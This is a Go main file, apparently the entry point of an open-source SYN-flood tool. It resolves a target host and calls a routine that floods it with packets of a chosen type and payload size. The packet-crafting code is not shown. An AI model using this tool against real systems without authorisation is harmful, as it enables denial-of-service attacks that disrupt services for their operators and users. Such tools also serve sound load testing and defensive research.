package main

import (
	"context"
	"github.com/bilalcaliskan/syn-flood/internal/options"
	"github.com/bilalcaliskan/syn-flood/internal/raw"
	"github.com/dimiro1/banner"
	"io/ioutil"
	"log"
	"net"
	"os"
	"regexp"
	"strings"
)

func init() {
	bannerBytes, _ := ioutil.ReadFile("banner.txt")
	banner.Init(os.Stdout, true, false, strings.NewReader(string(bannerBytes)))
}

func main() {
	sfo := options.GetSynFloodOptions()
	host := sfo.Host
	isIP, _ := regexp.MatchString("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$", host)
	isDNS, _ := regexp.MatchString("^(([a-zA-Z]|[a-zA-Z][a-zA-Z0-9\\-]*[a-zA-Z0-9])\\.)*([A-Za-z]|[A-Za-z][A-Za-z0-9\\-]*[A-Za-z0-9])$", host)

	if !isIP && isDNS {
		log.Printf("%s is a DNS record, making DNS lookup\n", host)
		ipRecords, err := net.DefaultResolver.LookupIP(context.Background(), "ip4", host)
		if err != nil {
			log.Fatalf("an error occured on dns lookup: %s", err.Error())
		}

		log.Printf("dns lookup succeeded, found %s for %s\n", ipRecords[0].String(), host)
		host = ipRecords[0].String()
	}

	if err := raw.StartFlooding(host, sfo.Port, sfo.PayloadLength, sfo.FloodType); err != nil {
		log.Fatalf("an error occured on flooding process: %s", err.Error())
	}
}
